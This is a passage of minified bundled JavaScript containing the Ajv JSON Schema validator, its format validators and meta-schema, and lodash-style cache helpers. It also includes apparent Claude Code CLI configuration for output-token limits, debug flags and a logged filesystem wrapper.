N(){if(q.strictSchema===!1)return Q.nil;return Q._`${K} && !${w}`}function C(){let _=M.$async?Q._`(${A}.async ? await ${w}(${$}) : ${w}(${$}))`:Q._`${w}(${$})`,h=Q._`(typeof ${w} == "function" ? ${_} : ${w}.test(${$}))`;return Q._`${w} && ${w} !== true && ${O} === ${G} && !${h}`}}function j(){let F=L.formats[U];if(!F){N();return}if(F===!0)return;let[A,O,w]=C(F);if(A===G)W.pass(_());function N(){if(q.strictSchema===!1){L.logger.warn(h());return}throw Error(h());function h(){return`unknown format "${U}" ignored in schema at path "${Z}"`}}function C(h){let o=h instanceof RegExp?(0,Q.regexpCode)(h):q.code.formats?Q._`${q.code.formats}${(0,Q.getProperty)(U)}`:void 0,p=H.scopeValue("formats",{key:U,ref:h,code:o});if(typeof h=="object"&&!(h instanceof RegExp))return[h.type||"string",h.validate,Q._`${p}.validate`];return["string",h,p]}function _(){if(typeof F=="object"&&!(F instanceof RegExp)&&F.async){if(!M.$async)throw Error("async format in sync schema");return Q._`await ${w}(${$})`}return typeof O=="function"?Q._`${w}(${$})`:Q._`${w}.test(${$})`}}}};X.default=Y}),Vc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=Kc1(),J=[Q.default];X.default=J}),Bc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.contentVocabulary=X.metadataVocabulary=void 0,X.metadataVocabulary=["title","description","default","deprecated","readOnly","writeOnly","examples"],X.contentVocabulary=["contentMediaType","contentEncoding","contentSchema"]}),qc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=hu1(),J=au1(),Y=Uc1(),W=Vc1(),G=Bc1(),H=[Q.default,J.default,(0,Y.default)(),W.default,G.metadataVocabulary,G.contentVocabulary];X.default=H}),Zc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.DiscrError=void 0;var Q;(function(J){J.Tag="tag",J.Mapping="mapping"})(Q||(X.DiscrError=Q={}))}),Mc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=Zc1(),Y=JK(),W=wW(),G=D0(),H={message:({params:{discrError:z,tagName:U}})=>z===J.DiscrError.Tag?`tag "${U}" must be string`:`value of tag "${U}" must be in oneOf`,params:({params:{discrError:z,tag:U,tagName:K}})=>Q._`{error: ${z}, tag: ${K}, tagValue: ${U}}`},$={keyword:"discriminator",type:"object",schemaType:"object",error:H,code(z){let{gen:U,data:K,schema:B,parentSchema:q,it:Z}=z,{oneOf:M}=q;if(!Z.opts.discriminator)throw Error("discriminator: requires discriminator option");let L=B.propertyName;if(typeof L!="string")throw Error("discriminator: requires propertyName");if(B.mapping)throw Error("discriminator: mapping is not supported");if(!M)throw Error("discriminator: requires oneOf keyword");let R=U.let("valid",!1),j=U.const("tag",Q._`${K}${(0,Q.getProperty)(L)}`);U.if(Q._`typeof ${j} == "string"`,()=>F(),()=>z.error(!1,{discrError:J.DiscrError.Tag,tag:j,tagName:L})),z.ok(R);function F(){let w=O();U.if(!1);for(let N in w)U.elseIf(Q._`${j} === ${N}`),U.assign(R,A(w[N]));U.else(),z.error(!1,{discrError:J.DiscrError.Mapping,tag:j,tagName:L}),U.endIf()}function A(w){let N=U.name("valid"),C=z.subschema({keyword:"oneOf",schemaProp:w},N);return z.mergeEvaluated(C,Q.Name),N}function O(){var w;let N={},C=h(q),_=!0;for(let e=0;e<M.length;e++){let d=M[e];if((d===null||d===void 0?void 0:d.$ref)&&!(0,G.schemaHasRulesButRef)(d,Z.self.RULES)){let V1=d.$ref;if(d=Y.resolveRef.call(Z.self,Z.schemaEnv.root,Z.baseId,V1),d instanceof Y.SchemaEnv)d=d.schema;if(d===void 0)throw new W.default(Z.opts.uriResolver,Z.baseId,V1)}let Q1=(w=d===null||d===void 0?void 0:d.properties)===null||w===void 0?void 0:w[L];if(typeof Q1!="object")throw Error(`discriminator: oneOf subschemas (or referenced schemas) must have "properties/${L}"`);_=_&&(C||h(d)),o(Q1,e)}if(!_)throw Error(`discriminator: "${L}" must be required`);return N;function h({required:e}){return Array.isArray(e)&&e.includes(L)}function o(e,d){if(e.const)p(e.const,d);else if(e.enum)for(let Q1 of e.enum)p(Q1,d);else throw Error(`discriminator: "properties/${L}" must have "const" or "enum"`)}function p(e,d){if(typeof e!="string"||e in N)throw Error(`discriminator: "${L}" values must be unique strings`);N[e]=d}}}};X.default=$}),jc1=S1((X,Q)=>{Q.exports={$schema:"http://json-schema.org/draft-07/schema#",$id:"http://json-schema.org/draft-07/schema#",title:"Core schema meta-schema",definitions:{schemaArray:{type:"array",minItems:1,items:{$ref:"#"}},nonNegativeInteger:{type:"integer",minimum:0},nonNegativeIntegerDefault0:{allOf:[{$ref:"#/definitions/nonNegativeInteger"},{default:0}]},simpleTypes:{enum:["array","boolean","integer","null","number","object","string"]},stringArray:{type:"array",items:{type:"string"},uniqueItems:!0,default:[]}},type:["object","boolean"],properties:{$id:{type:"string",format:"uri-reference"},$schema:{type:"string",format:"uri"},$ref:{type:"string",format:"uri-reference"},$comment:{type:"string"},title:{type:"string"},description:{type:"string"},default:!0,readOnly:{type:"boolean",default:!1},examples:{type:"array",items:!0},multipleOf:{type:"number",exclusiveMinimum:0},maximum:{type:"number"},exclusiveMaximum:{type:"number"},minimum:{type:"number"},exclusiveMinimum:{type:"number"},maxLength:{$ref:"#/definitions/nonNegativeInteger"},minLength:{$ref:"#/definitions/nonNegativeIntegerDefault0"},pattern:{type:"string",format:"regex"},additionalItems:{$ref:"#"},items:{anyOf:[{$ref:"#"},{$ref:"#/definitions/schemaArray"}],default:!0},maxItems:{$ref:"#/definitions/nonNegativeInteger"},minItems:{$ref:"#/definitions/nonNegativeIntegerDefault0"},uniqueItems:{type:"boolean",default:!1},contains:{$ref:"#"},maxProperties:{$ref:"#/definitions/nonNegativeInteger"},minProperties:{$ref:"#/definitions/nonNegativeIntegerDefault0"},required:{$ref:"#/definitions/stringArray"},additionalProperties:{$ref:"#"},definitions:{type:"object",additionalProperties:{$ref:"#"},default:{}},properties:{type:"object",additionalProperties:{$ref:"#"},default:{}},patternProperties:{type:"object",additionalProperties:{$ref:"#"},propertyNames:{format:"regex"},default:{}},dependencies:{type:"object",additionalProperties:{anyOf:[{$ref:"#"},{$ref:"#/definitions/stringArray"}]}},propertyNames:{$ref:"#"},const:!0,enum:{type:"array",items:!0,minItems:1,uniqueItems:!0},type:{anyOf:[{$ref:"#/definitions/simpleTypes"},{type:"array",items:{$ref:"#/definitions/simpleTypes"},minItems:1,uniqueItems:!0}]},format:{type:"string"},contentMediaType:{type:"string"},contentEncoding:{type:"string"},if:{$ref:"#"},then:{$ref:"#"},else:{$ref:"#"},allOf:{$ref:"#/definitions/schemaArray"},anyOf:{$ref:"#/definitions/schemaArray"},oneOf:{$ref:"#/definitions/schemaArray"},not:{$ref:"#"}},default:!0}}),oN=S1((X,Q)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.MissingRefError=X.ValidationError=X.CodeGen=X.Name=X.nil=X.stringify=X.str=X._=X.KeywordCxt=X.Ajv=void 0;var J=vu1(),Y=qc1(),W=Mc1(),G=jc1(),H=["/properties"],$="http://json-schema.org/draft-07/schema";class z extends J.default{_addVocabularies(){if(super._addVocabularies(),Y.default.forEach((Z)=>this.addVocabulary(Z)),this.opts.discriminator)this.addKeyword(W.default)}_addDefaultMetaSchema(){if(super._addDefaultMetaSchema(),!this.opts.meta)return;let Z=this.opts.$data?this.$dataMetaSchema(G,H):G;this.addMetaSchema(Z,$,!1),this.refs["http://json-schema.org/schema"]=$}defaultMeta(){return this.opts.defaultMeta=super.defaultMeta()||(this.getSchema($)?$:void 0)}}X.Ajv=z,Q.exports=X=z,Q.exports.Ajv=z,Object.defineProperty(X,"__esModule",{value:!0}),X.default=z;var U=NW();Object.defineProperty(X,"KeywordCxt",{enumerable:!0,get:function(){return U.KeywordCxt}});var K=V0();Object.defineProperty(X,"_",{enumerable:!0,get:function(){return K._}}),Object.defineProperty(X,"str",{enumerable:!0,get:function(){return K.str}}),Object.defineProperty(X,"stringify",{enumerable:!0,get:function(){return K.stringify}}),Object.defineProperty(X,"nil",{enumerable:!0,get:function(){return K.nil}}),Object.defineProperty(X,"Name",{enumerable:!0,get:function(){return K.Name}}),Object.defineProperty(X,"CodeGen",{enumerable:!0,get:function(){return K.CodeGen}});var B=QK();Object.defineProperty(X,"ValidationError",{enumerable:!0,get:function(){return B.default}});var q=wW();Object.defineProperty(X,"MissingRefError",{enumerable:!0,get:function(){return q.default}})}),Fc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.formatNames=X.fastFormats=X.fullFormats=void 0;function Q(p,e){return{validate:p,compare:e}}X.fullFormats={date:Q(G,H),time:Q(z(!0),U),"date-time":Q(q(!0),Z),"iso-time":Q(z(),K),"iso-date-time":Q(q(),M),duration:/^P(?!$)((\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+S)?)?|(\d+W)?)$/,uri:j,"uri-reference":/^(?:[a-z][a-z0-9+\-.]*:)?(?:\/?\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:]|%[0-9a-f]{2})*@)?(?:\[(?:(?:(?:(?:[0-9a-f]{1,4}:){6}|::(?:[0-9a-f]{1,4}:){5}|(?:[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){4}|(?:(?:[0-9a-f]{1,4}:){0,1}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){3}|(?:(?:[0-9a-f]{1,4}:){0,2}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){2}|(?:(?:[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?::[0-9a-f]{1,4}:|(?:(?:[0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?::)(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?))|(?:(?:[0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4})?::[0-9a-f]{1,4}|(?:(?:[0-9a-f]{1,4}:){0,6}[0-9a-f]{1,4})?::)|[Vv][0-9a-f]+\.[a-z0-9\-._~!$&'()*+,;=:]+)\]|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|(?:[a-z0-9\-._~!$&'"()*+,;=]|%[0-9a-f]{2})*)(?::\d*)?(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*|\/(?:(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*)?|(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*)?(?:\?(?:[a-z0-9\-._~!$&'"()*+,;=:@/?]|%[0-9a-f]{2})*)?(?:#(?:[a-z0-9\-._~!$&'"()*+,;=:@/?]|%[0-9a-f]{2})*)?$/i,"uri-template":/^(?:(?:[^\x00-\x20"'<>%\\^`{|}]|%[0-9a-f]{2})|\{[+#./;?&=,!@|]?(?:[a-z0-9_]|%[0-9a-f]{2})+(?::[1-9][0-9]{0,3}|\*)?(?:,(?:[a-z0-9_]|%[0-9a-f]{2})+(?::[1-9][0-9]{0,3}|\*)?)*\})*$/i,url:/^(?:https?|ftp):\/\/(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z0-9\u{00a1}-\u{ffff}]+-)*[a-z0-9\u{00a1}-\u{ffff}]+)(?:\.(?:[a-z0-9\u{00a1}-\u{ffff}]+-)*[a-z0-9\u{00a1}-\u{ffff}]+)*(?:\.(?:[a-z\u{00a1}-\u{ffff}]{2,})))(?::\d{2,5})?(?:\/[^\s]*)?$/iu,email:/^[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/i,hostname:/^(?=.{1,253}\.?$)[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[-0-9a-z]{0,61}[0-9a-z])?)*\.?$/i,ipv4:/^(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)$/,ipv6:/^((([0-9a-f]{1,4}:){7}([0-9a-f]{1,4}|:))|(([0-9a-f]{1,4}:){6}(:[0-9a-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9a-f]{1,4}:){5}(((:[0-9a-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9a-f]{1,4}:){4}(((:[0-9a-f]{1,4}){1,3})|((:[0-9a-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){3}(((:[0-9a-f]{1,4}){1,4})|((:[0-9a-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){2}(((:[0-9a-f]{1,4}){1,5})|((:[0-9a-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){1}(((:[0-9a-f]{1,4}){1,6})|((:[0-9a-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9a-f]{1,4}){1,7})|((:[0-9a-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))$/i,regex:o,uuid:/^(?:urn:uuid:)?[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}$/i,"json-pointer":/^(?:\/(?:[^~/]|~0|~1)*)*$/,"json-pointer-uri-fragment":/^#(?:\/(?:[a-z0-9_\-.!$&'()*+,;:=@]|%[0-9a-f]{2}|~0|~1)*)*$/i,"relative-json-pointer":/^(?:0|[1-9][0-9]*)(?:#|(?:\/(?:[^~/]|~0|~1)*)*)$/,byte:A,int32:{type:"number",validate:N},int64:{type:"number",validate:C},float:{type:"number",validate:_},double:{type:"number",validate:_},password:!0,binary:!0},X.fastFormats={...X.fullFormats,date:Q(/^\d\d\d\d-[0-1]\d-[0-3]\d$/,H),time:Q(/^(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)$/i,U),"date-time":Q(/^\d\d\d\d-[0-1]\d-[0-3]\dt(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)$/i,Z),"iso-time":Q(/^(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)?$/i,K),"iso-date-time":Q(/^\d\d\d\d-[0-1]\d-[0-3]\d[t\s](?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)?$/i,M),uri:/^(?:[a-z][a-z0-9+\-.]*:)(?:\/?\/)?[^\s]*$/i,"uri-reference":/^(?:(?:[a-z][a-z0-9+\-.]*:)?\/?\/)?(?:[^\\\s#][^\s#]*)?(?:#[^\\\s]*)?$/i,email:/^[a-z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)*$/i},X.formatNames=Object.keys(X.fullFormats);function J(p){return p%4===0&&(p%100!==0||p%400===0)}var Y=/^(\d\d\d\d)-(\d\d)-(\d\d)$/,W=[0,31,28,31,30,31,30,31,31,30,31,30,31];function G(p){let e=Y.exec(p);if(!e)return!1;let d=+e[1],Q1=+e[2],V1=+e[3];return Q1>=1&&Q1<=12&&V1>=1&&V1<=(Q1===2&&J(d)?29:W[Q1])}function H(p,e){if(!(p&&e))return;if(p>e)return 1;if(p<e)return-1;return 0}var $=/^(\d\d):(\d\d):(\d\d(?:\.\d+)?)(z|([+-])(\d\d)(?::?(\d\d))?)?$/i;function z(p){return function(d){let Q1=$.exec(d);if(!Q1)return!1;let V1=+Q1[1],D1=+Q1[2],n=+Q1[3],t=Q1[4],u=Q1[5]==="-"?-1:1,E=+(Q1[6]||0),y=+(Q1[7]||0);if(E>23||y>59||p&&!t)return!1;if(V1<=23&&D1<=59&&n<60)return!0;let a=D1-y*u,I=V1-E*u-(a<0?1:0);return(I===23||I===-1)&&(a===59||a===-1)&&n<61}}function U(p,e){if(!(p&&e))return;let d=new Date("2020-01-01T"+p).valueOf(),Q1=new Date("2020-01-01T"+e).valueOf();if(!(d&&Q1))return;return d-Q1}function K(p,e){if(!(p&&e))return;let d=$.exec(p),Q1=$.exec(e);if(!(d&&Q1))return;if(p=d[1]+d[2]+d[3],e=Q1[1]+Q1[2]+Q1[3],p>e)return 1;if(p<e)return-1;return 0}var B=/t|\s/i;function q(p){let e=z(p);return function(Q1){let V1=Q1.split(B);return V1.length===2&&G(V1[0])&&e(V1[1])}}function Z(p,e){if(!(p&&e))return;let d=new Date(p).valueOf(),Q1=new Date(e).valueOf();if(!(d&&Q1))return;return d-Q1}function M(p,e){if(!(p&&e))return;let[d,Q1]=p.split(B),[V1,D1]=e.split(B),n=H(d,V1);if(n===void 0)return;return n||U(Q1,D1)}var L=/\/|:/,R=/^(?:[a-z][a-z0-9+\-.]*:)(?:\/?\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:]|%[0-9a-f]{2})*@)?(?:\[(?:(?:(?:(?:[0-9a-f]{1,4}:){6}|::(?:[0-9a-f]{1,4}:){5}|(?:[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){4}|(?:(?:[0-9a-f]{1,4}:){0,1}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){3}|(?:(?:[0-9a-f]{1,4}:){0,2}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){2}|(?:(?:[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?::[0-9a-f]{1,4}:|(?:(?:[0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?::)(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?))|(?:(?:[0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4})?::[0-9a-f]{1,4}|(?:(?:[0-9a-f]{1,4}:){0,6}[0-9a-f]{1,4})?::)|[Vv][0-9a-f]+\.[a-z0-9\-._~!$&'()*+,;=:]+)\]|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|(?:[a-z0-9\-._~!$&'()*+,;=]|%[0-9a-f]{2})*)(?::\d*)?(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*|\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*)?|(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*)(?:\?(?:[a-z0-9\-._~!$&'()*+,;=:@/?]|%[0-9a-f]{2})*)?(?:#(?:[a-z0-9\-._~!$&'()*+,;=:@/?]|%[0-9a-f]{2})*)?$/i;function j(p){return L.test(p)&&R.test(p)}var F=/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/gm;function A(p){return F.lastIndex=0,F.test(p)}var O=-2147483648,w=2147483647;function N(p){return Number.isInteger(p)&&p<=w&&p>=O}function C(p){return Number.isInteger(p)}function _(){return!0}var h=/[^\\]\\Z/;function o(p){if(h.test(p))return!1;try{return new RegExp(p),!0}catch(e){return!1}}}),Oc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.formatLimitDefinition=void 0;var Q=oN(),J=V0(),Y=J.operators,W={formatMaximum:{okStr:"<=",ok:Y.LTE,fail:Y.GT},formatMinimum:{okStr:">=",ok:Y.GTE,fail:Y.LT},formatExclusiveMaximum:{okStr:"<",ok:Y.LT,fail:Y.GTE},formatExclusiveMinimum:{okStr:">",ok:Y.GT,fail:Y.LTE}},G={message:({keyword:$,schemaCode:z})=>J.str`should be ${W[$].okStr} ${z}`,params:({keyword:$,schemaCode:z})=>J._`{comparison: ${W[$].okStr}, limit: ${z}}`};X.formatLimitDefinition={keyword:Object.keys(W),type:"string",schemaType:"string",$data:!0,error:G,code($){let{gen:z,data:U,schemaCode:K,keyword:B,it:q}=$,{opts:Z,self:M}=q;if(!Z.validateFormats)return;let L=new Q.KeywordCxt(q,M.RULES.all.format.definition,"format");if(L.$data)R();else j();function R(){let A=z.scopeValue("formats",{ref:M.formats,code:Z.code.formats}),O=z.const("fmt",J._`${A}[${L.schemaCode}]`);$.fail$data((0,J.or)(J._`typeof ${O} != "object"`,J._`${O} instanceof RegExp`,J._`typeof ${O}.compare != "function"`,F(O)))}function j(){let A=L.schema,O=M.formats[A];if(!O||O===!0)return;if(typeof O!="object"||O instanceof RegExp||typeof O.compare!="function")throw Error(`"${B}": format "${A}" does not define "compare" function`);let w=z.scopeValue("formats",{key:A,ref:O,code:Z.code.formats?J._`${Z.code.formats}${(0,J.getProperty)(A)}`:void 0});$.fail$data(F(w))}function F(A){return J._`${A}.compare(${U}, ${K}) ${W[B].fail} 0`}},dependencies:["format"]};var H=($)=>{return $.addKeyword(X.formatLimitDefinition),$};X.default=H}),Ac1=S1((X,Q)=>{Object.defineProperty(X,"__esModule",{value:!0});var J=Fc1(),Y=Oc1(),W=V0(),G=new W.Name("fullFormats"),H=new W.Name("fastFormats"),$=(U,K={keywords:!0})=>{if(Array.isArray(K))return z(U,K,J.fullFormats,G),U;let[B,q]=K.mode==="fast"?[J.fastFormats,H]:[J.fullFormats,G],Z=K.formats||J.formatNames;if(z(U,Z,B,q),K.keywords)(0,Y.default)(U);return U};$.get=(U,K="full")=>{let q=(K==="fast"?J.fastFormats:J.fullFormats)[U];if(!q)throw Error(`Unknown format "${U}"`);return q};function z(U,K,B,q){var Z,M;(Z=(M=U.opts.code).formats)!==null&&Z!==void 0||(M.formats=W._`require("ajv-formats/dist/formats").${q}`);for(let L of K)U.addFormat(L,B[L])}Q.exports=X=$,Object.defineProperty(X,"__esModule",{value:!0}),X.default=$});Cc1=typeof global=="object"&&global&&global.Object===Object&&global,Pc1=Cc1,Sc1=typeof self=="object"&&self&&self.Object===Object&&self,Ec1=Pc1||Sc1||Function("return this")(),WK=Ec1,Tc1=WK.Symbol,KW=Tc1,tN=Object.prototype,_c1=tN.hasOwnProperty,kc1=tN.toString,OQ=KW?KW.toStringTag:void 0;vc1=bc1,xc1=Object.prototype,fc1=xc1.toString;yc1=hc1,KN=KW?KW.toStringTag:void 0;cc1=uc1;eN=lc1;ac1=nc1,oc1=WK["__core-js_shared__"],mU=oc1,VN=function(){var X=/[^.]+$/.exec(mU&&mU.keys&&mU.keys.IE_PROTO||"");return X?"Symbol(src)_1."+X:""}();tc1=sc1,ec1=Function.prototype,Xl1=ec1.toString;Jl1=Ql1,Yl1=/[\\^$.*+?()[\]{}|]/g,Wl1=/^\[object .+?Constructor\]$/,Gl1=Function.prototype,Hl1=Object.prototype,$l1=Gl1.toString,zl1=Hl1.hasOwnProperty,Ul1=RegExp("^"+$l1.call(zl1).replace(Yl1,"\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,"$1.*?")+"$");Vl1=Kl1;ql1=Bl1;Xw=Zl1,Ml1=Xw(Object,"create"),DQ=Ml1;Fl1=jl1;Al1=Ol1,Ll1=Object.prototype,Dl1=Ll1.hasOwnProperty;wl1=Nl1,Il1=Object.prototype,Cl1=Il1.hasOwnProperty;Sl1=Pl1;_l1=Tl1;y5.prototype.clear=Fl1;y5.prototype.delete=Al1;y5.prototype.get=wl1;y5.prototype.has=Sl1;y5.prototype.set=_l1;BN=y5;bl1=kl1;xl1=vl1;IW=fl1,hl1=Array.prototype,yl1=hl1.splice;ml1=gl1;cl1=ul1;pl1=ll1;il1=dl1;g5.prototype.clear=bl1;g5.prototype.delete=ml1;g5.prototype.get=cl1;g5.prototype.has=pl1;g5.prototype.set=il1;rl1=g5,nl1=Xw(WK,"Map"),al1=nl1;sl1=ol1;el1=tl1;CW=Xp1;Jp1=Qp1;Wp1=Yp1;Hp1=Gp1;zp1=$p1;m5.prototype.clear=sl1;m5.prototype.delete=Jp1;m5.prototype.get=Wp1;m5.prototype.has=Hp1;m5.prototype.set=zp1;Qw=m5;GK.Cache=Qw;hQ=GK;Vp1=hQ((X)=>{if(!X||X.trim()==="")return null;let Q=X.split(",").map((G)=>G.trim()).filter(Boolean);if(Q.length===0)return null;let J=Q.some((G)=>G.startsWith("!")),Y=Q.some((G)=>!G.startsWith("!"));if(J&&Y)return null;let W=Q.map((G)=>G.replace(/^!/,"").toLowerCase());return{include:J?[]:W,exclude:J?W:[],isExclusive:J}});Rp1=Ww("BASH_MAX_OUTPUT_LENGTH"),pz0=Ww("TASK_MAX_OUTPUT_LENGTH"),Lp1={name:"CLAUDE_CODE_MAX_OUTPUT_TOKENS",default:32000,validate:(X)=>{if(!X)return{effective:32000,status:"valid"};let Y=parseInt(X,10);if(isNaN(Y)||Y<=0)return{effective:32000,status:"invalid",message:`Invalid value "${X}" (using default: 32000)`};if(Y>64000)return{effective:64000,status:"capped",message:`Capped from ${Y} to 64000`};return{effective:Y,status:"valid"}}};B7=Dp1();jN=new Set;Sp1=hQ(()=>{return ZN(process.env.DEBUG)||ZN(process.env.DEBUG_SDK)||process.argv.includes("--debug")||process.argv.includes("-d")||Uw()||process.argv.some((X)=>X.startsWith("--debug="))}),Ep1=hQ(()=>{let X=process.argv.find((J)=>J.startsWith("--debug="));if(!X)return null;let Q=X.substring(8);return Vp1(Q)}),Uw=hQ(()=>{return process.argv.includes("--debug-to-stderr")||process.argv.includes("-d2e")});bp1=hQ(()=>{if(process.argv[2]==="--ripgrep")return;try{let X=Kw(),Q=iU(X),J=Yw(Q,"latest");if(!v8().existsSync(Q))v8().mkdirSync(Q);if(v8().existsSync(J))try{v8().unlinkSync(J)}catch{}v8().symlinkSync(X,J)}catch{}});vp1={cwd(){return process.cwd()},existsSync(X){return X9(`existsSync(${X})`,()=>J0.existsSync(X))},async stat(X){return Ic1(X)},statSync(X){return X9(`statSync(${X})`,()=>J0.statSync(X))},lstatSync(X){return X9(`lstatSync(${X})`,()=>J0.lstatSync(X))},readFileSync(X,Q){return X9(`readFileSync(${X})`,()=>J0.readFileSync(X,{encoding:Q.encoding}))},readFileBytesSync(X){return X9(`readFileBytesSync(${X})`,()=>J0.readFileSync(X))},readSync(X,Q){return X9(`readSync(${X}, ${Q.length} bytes)`,()=>{let J=void 0;try{J=J0.openSync(X,"r");let Y=Buffer.alloc(Q.length),W=J0.readSync(J,Y,0,Q.length,0);return{buffer:Y,bytesRead:W}}finally{if(J)J0.closeSync(J)}})},appendFileSync(X,Q,J){return X9(`appendFileSync(${X}, ${Q.length} chars)`,()=>{if(!J0.existsSync(X)&&J?.mode!==void 0){let Y=J0.openSync(X,"a",J.mode);try{J0.appendFileSync(Y,Q)}finally{J0.closeSync(Y)}}else J0.appendFileSync(X,Q)})},copyFileSync(X,Q){return X9(`copyFileSync(${X}  ${Q})`,()=>J0.copyFileSync(X,Q))},unlinkSync(X){return X9(`unlinkSync(${X})`,()=>J0.unlinkSync(X))},renameSync(X,Q){return X9(`renameSync(${X}  ${Q})`,()=>J0.renameSync(X,Q))},linkSync(X,Q){return X9(`linkSync(${X}  ${Q})`,()=>J0.linkSync(X,Q))},symlinkSync(X,Q){return X9(`symlinkSync(${X}  ${Q})`,()=>J0.symlinkSync(X,Q))},readlinkSync(X){return X9(`readlinkSync(${X})`,()=>J0.readlinkSync(X))},realpathSync(X){return X9(`realpathSync(${X})`,()=>J0.realpathSync(X))},mkdirSync(X,Q){return X9(`mkdirSync(${X})`,()=>{if(!J0.existsSync(X)){let J={recursive:!0};if(Q?.mode!==void 0)J.mode=Q.mode;J0.mkdirSync(X,J)}})},readdirSync(X){return 